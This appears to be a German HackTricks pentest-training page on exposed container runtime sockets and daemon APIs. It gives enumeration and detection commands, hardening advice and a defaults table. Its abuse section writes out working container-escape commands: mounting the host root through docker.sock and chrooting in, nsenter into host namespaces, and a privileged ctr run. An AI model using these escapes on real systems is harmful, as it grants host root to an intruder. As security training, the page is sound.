# Runtime-API und Daemon-Exposition

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Viele echte Container-Kompromittierungen beginnen überhaupt nicht mit einem Namespace-Escape. Sie beginnen mit dem Zugriff auf die Runtime-Kontrollebene. Wenn ein Workload über einen gemounteten Unix socket oder einen exponierten TCP-Listener mit `dockerd`, `containerd`, CRI-O, Podman oder kubelet kommunizieren kann, kann ein Angreifer möglicherweise einen neuen Container mit höheren Rechten anfordern, das Host-Dateisystem mounten, Host-Namespaces beitreten oder sensible Node-Informationen abrufen. In diesen Fällen ist die Runtime-API die eigentliche Sicherheitsgrenze, und ihre Kompromittierung ist funktional nah an einer Kompromittierung des Hosts.

Deshalb sollte die Exponierung von Runtime-Sockets getrennt von Kernel-Schutzmechanismen dokumentiert werden. Ein Container mit normalen seccomp-, capabilities- und MAC-Einschränkungen kann dennoch nur einen API-Aufruf von einer Host-Kompromittierung entfernt sein, wenn `/var/run/docker.sock` oder `/run/containerd/containerd.sock` darin gemountet sind. Die Kernel-Isolierung des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Management-Ebene vollständig exponiert bleibt.

## Daemon-Zugriffsmodelle

Docker Engine stellt seine privilegierte API traditionell über den lokalen Unix-Socket unter `unix:///var/run/docker.sock` bereit. Historisch wurde sie auch remote über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen TLS-geschützten Listener auf `2376` exponiert. Die Remote-Exponierung des Daemons ohne starke TLS- und Client-Authentifizierung verwandelt die Docker-API effektiv in eine Remote-Root-Schnittstelle.

containerd, CRI-O, Podman und kubelet bieten ähnliche risikoreiche Angriffsflächen. Die Namen und Workflows unterscheiden sich, die Logik jedoch nicht. Wenn die Schnittstelle dem Aufrufer erlaubt, Workloads zu erstellen, Host-Pfade zu mounten, Anmeldeinformationen abzurufen oder laufende Container zu verändern, ist die Schnittstelle ein privilegierter Management-Kanal und sollte entsprechend behandelt werden.

Gängige lokale Pfade, die überprüft werden sollten, sind:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ältere oder spezialisiertere Stacks können auch Endpunkte wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` exponieren. Diese sind in modernen Umgebungen seltener, sollten bei Auftreten jedoch mit derselben Vorsicht behandelt werden, da sie Laufzeit-Kontrollschnittstellen statt gewöhnlicher Anwendungs-Sockets darstellen.

## Secure Remote Access

Wenn ein Daemon über den lokalen Socket hinaus exponiert werden muss, sollte die Verbindung mit TLS geschützt und idealerweise mit gegenseitiger Authentifizierung versehen werden, sodass der Daemon den Client und der Client den Daemon überprüft. Die alte Gewohnheit, den Docker daemon aus Bequemlichkeit über plain HTTP zu öffnen, ist einer der gefährlichsten Fehler in der Container-Administration, weil die API ausreichend mächtig ist, um direkt privilegierte Container zu erstellen.

The historical Docker configuration pattern looked like:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Auf systemd-basierten Hosts kann die Kommunikation eines Daemons auch als `fd://` erscheinen, was bedeutet, dass der Prozess einen von systemd vorab geöffneten Socket erbt, anstatt ihn selbst direkt zu binden. Wichtiger als die genaue Syntax ist die Sicherheitsfolge. Sobald der Daemon über einen eng berechtigten lokalen Socket hinaus lauscht, werden Transportsicherheit und Client-Authentifizierung Pflicht statt optionaler Härtung.

## Missbrauch

Wenn ein runtime-Socket vorhanden ist, prüfen Sie, welcher es ist, ob ein kompatibler Client existiert und ob direkter HTTP- oder gRPC-Zugriff möglich ist:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Diese Befehle sind nützlich, weil sie zwischen einem toten Pfad, einer eingehängten, aber unzugänglichen Socket und einer aktiven, privilegierten API unterscheiden. Wenn der Client erfolgreich ist, stellt sich die nächste Frage, ob die API einen neuen Container starten kann, der ein host bind mount oder host namespace sharing ermöglicht.

### Vollständiges Beispiel: Docker Socket zum Host-Root

Wenn `docker.sock` erreichbar ist, besteht der klassische Escape darin, einen neuen Container zu starten, der das Root-Dateisystem des Hosts einbindet, und anschließend mittels `chroot` in dieses zu wechseln:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dies ermöglicht direkte Ausführung als root auf dem Host über den Docker daemon. Die Auswirkungen beschränken sich nicht auf Datei-Lesezugriffe. Sobald sich der Angreifer im neuen Container befindet, kann er Host-Dateien ändern, Anmeldeinformationen erbeuten, Persistenz installieren oder zusätzliche privilegierte Workloads starten.

### Vollständiges Beispiel: Docker Socket To Host Namespaces

Wenn der Angreifer Namespace-Eintritt statt nur Dateisystemzugriff bevorzugt:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Dieser Pfad erreicht den Host, indem er die Runtime anweist, einen neuen Container mit expliziter host-namespace exposure zu erstellen, anstatt den aktuellen auszunutzen.

### Vollständiges Beispiel: containerd Socket

Ein gemounteter `containerd`-Socket ist in der Regel genauso gefährlich:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Die Auswirkung ist erneut die Kompromittierung des Hosts. Auch wenn Docker-spezifische Werkzeuge fehlen, kann eine andere Runtime-API dennoch dieselbe administrative Macht bieten.

## Prüfungen

Ziel dieser Prüfungen ist es festzustellen, ob der Container eine Management-Ebene erreichen kann, die außerhalb der Vertrauensgrenze liegen sollte.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Was hier interessant ist:

- Ein gemounteter Runtime-Socket ist in der Regel ein direktes administratives Primitive und nicht bloß eine Informationsoffenlegung.
- Ein TCP-Listener auf `2375` ohne TLS sollte als Zustand betrachtet werden, der auf eine Remote-Kompromittierung hindeutet.
- Umgebungsvariablen wie `DOCKER_HOST` zeigen oft, dass die Workload bewusst dafür ausgelegt wurde, mit dem Host-Runtime zu kommunizieren.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Schwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig lokaler Unix-Socket | `dockerd` hört auf dem lokalen Socket und der Daemon läuft normalerweise mit root-Rechten | Mounten von `/var/run/docker.sock`, Exponieren von `tcp://...:2375`, schwaches oder fehlendes TLS auf `2376` |
| Podman | Standardmäßig daemonlose CLI | Für die gewöhnliche lokale Nutzung wird kein lang laufender privilegierter Daemon benötigt; API-Sockets können jedoch exponiert werden, wenn `podman system service` aktiviert ist | Exponieren von `podman.sock`, breit laufender Service, API-Nutzung mit root-Rechten |
| containerd | Lokaler privilegierter Socket | Administrative API über den lokalen Socket exponiert und normalerweise von höherstufigen Tools verwendet | Mounten von `containerd.sock`, weitreichender Zugriff über `ctr` oder `nerdctl`, Exponieren privilegierter Namespaces |
| CRI-O | Lokaler privilegierter Socket | Der CRI-Endpunkt ist für node-lokale vertrauenswürdige Komponenten vorgesehen | Mounten von `crio.sock`, Exponieren des CRI-Endpunkts gegenüber nicht vertrauenswürdigen Workloads |
| Kubernetes kubelet | Node-lokale Verwaltungs-API | Das Kubelet sollte von Pods aus nicht breit erreichbar sein; Zugriff kann je nach authn/authz den Pod-Zustand, Credentials und Ausführungsfunktionen offenlegen | Mounten von kubelet-Sockets oder Zertifikaten, schwache kubelet-Auth, Host-Networking plus erreichbarer kubelet-Endpunkt |
